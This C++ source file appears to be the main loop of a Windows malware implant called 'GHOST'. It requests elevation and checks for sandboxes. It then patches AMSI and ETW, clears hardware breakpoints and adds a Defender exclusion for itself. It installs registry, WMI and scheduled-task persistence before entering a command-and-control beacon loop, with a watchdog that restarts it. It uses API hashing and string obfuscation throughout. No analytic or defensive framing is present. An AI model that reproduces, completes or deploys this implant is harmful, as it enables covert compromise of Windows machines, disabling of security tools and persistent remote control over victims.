#include <windows.h>
#include <stdio.h>
#include <algorithm>
#include <shellapi.h>
#include "syscalls.hpp"
#include "evasion.hpp"
#include "c2.hpp"
#include "utils.hpp"
#include "persistence.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"

static void NtSleep(DWORD ms) {
    typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
    static NtDelayExecution_t pfn = nullptr;
    if (!pfn) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        if (h) pfn = reinterpret_cast<NtDelayExecution_t>(HashProc(h, FNV("NtDelayExecution")));
    }
    if (pfn) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfn(FALSE, &li);
    } else Sleep(ms);
}

static void DecoyLoop() {
    volatile unsigned long long fib = 1, a = 0, b = 1;
    for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
}

// ─── Admin elevation ──────────────────────────────────────────────────────────
static BOOL EnsureElevated() {
    if (IsElevated()) return TRUE;
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    SHELLEXECUTEINFOW sei = {};
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"runas";
    sei.lpFile = exePath;
    sei.lpParameters = L"--elevated";
    sei.nShow = SW_HIDE;
    if (ShellExecuteExW(&sei)) { Sleep(1000); return FALSE; }
    MessageBoxW(NULL, L"GHOST requires administrator privileges.", L"Elevation Required", MB_ICONERROR | MB_OK);
    return FALSE;
}

DWORD WINAPI ImplantThread(LPVOID) {
    printf("[DEBUG] ImplantThread started\n");
    fflush(stdout);

    // ─── Sandbox detection → deep sleep then restart via watchdog ─────────
    if (SandboxCheck()) {
        printf("[DEBUG] Sandbox detected – entering deep sleep (1–4 hours).\n");
        fflush(stdout);
        DeepSleep();
        return 1; // non-zero → watchdog restarts; returning 0 terminates the process
    }

    DecoyLoop();
    printf("[DEBUG] DecoyLoop done\n");
    fflush(stdout);

    // ─── Syscalls ──────────────────────────────────────────────────────────
    printf("[DEBUG] Initializing syscalls...\n");
    fflush(stdout);
    while (!InitializeSyscalls()) {
        printf("[DEBUG] InitializeSyscalls failed – retrying in 5s\n");
        fflush(stdout);
        NtSleep(5000);
    }
    printf("[DEBUG] Syscalls initialized\n");
    fflush(stdout);

    // ─── Evasion ────────────────────────────────────────────────────────────
    printf("[DEBUG] Patching AMSI/ETW/HW-BP...\n");
    fflush(stdout);
    PatchAMSI();
    PatchETW();
    ClearHardwareBreakpoints();
    printf("[DEBUG] Evasion applied\n");
    fflush(stdout);

    // ─── Defender exclusion (registry) ─────────────────────────────────────
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    if (IsElevated()) {
        printf("[DEBUG] Adding Defender exclusion (registry)\n");
        fflush(stdout);
        AddDefenderExclusion(exePath);
    }

    // ─── Persistence (all layers) ──────────────────────────────────────────
    printf("[DEBUG] Installing persistence...\n");
    fflush(stdout);
    InstallRegistryPersistence(exePath);
    if (!IsWmiPersistenceInstalled()) {
        InstallWmiPersistence(exePath);
        InstallWmiScriptPersistence(exePath);
    }
    if (!IsScheduledTaskInstalled()) {
        InstallScheduledTaskPersistence(exePath);
    }
    printf("[DEBUG] Persistence installed\n");
    fflush(stdout);

    // ─── Start C2 beacon loop (and Telegram poller inside) ──────────────
    printf("[DEBUG] Entering BeaconLoop...\n");
    fflush(stdout);
    BeaconLoop();

    printf("[DEBUG] BeaconLoop returned (clean exit)\n");
    fflush(stdout);
    return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    // ponytail: attach console in debug so printf is visible; remove for release
#ifdef DEBUG
    AllocConsole();
    FILE* f = nullptr;
    freopen_s(&f, "CONOUT$", "w", stdout);
    freopen_s(&f, "CONOUT$", "w", stderr);
#endif
    printf("[DEBUG] WinMain entered\n");
    fflush(stdout);

    // Elevate if not already admin
    if (strstr(lpCmdLine, "--elevated") == nullptr) {
        if (!EnsureElevated()) {
            printf("[DEBUG] Elevation requested – exiting.\n");
            fflush(stdout);
            return 0;
        }
    }
    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);

    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) return 0;
    auto _CreateThread = HASHPROC(hKernel32, CreateThread);
    auto _WaitForSingleObject = HASHPROC(hKernel32, WaitForSingleObject);
    auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);
    auto _GetExitCodeThread = HASHPROC(hKernel32, GetExitCodeThread);
    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) return 0;

    // Watchdog loop
    DWORD restartCount = 0;
    while (true) {
        if (restartCount > 0) {
            DWORD backoffMs = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
            Sleep(backoffMs);
        }
        HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
        if (!hThread) { Sleep(5000); ++restartCount; continue; }
        _WaitForSingleObject(hThread, INFINITE);
        DWORD exitCode = 0;
        _GetExitCodeThread(hThread, &exitCode);
        _CloseHandle(hThread);
        if (exitCode == 0) { printf("[DEBUG] Clean exit – terminating.\n"); fflush(stdout); return 0; }
        ++restartCount;
    }
}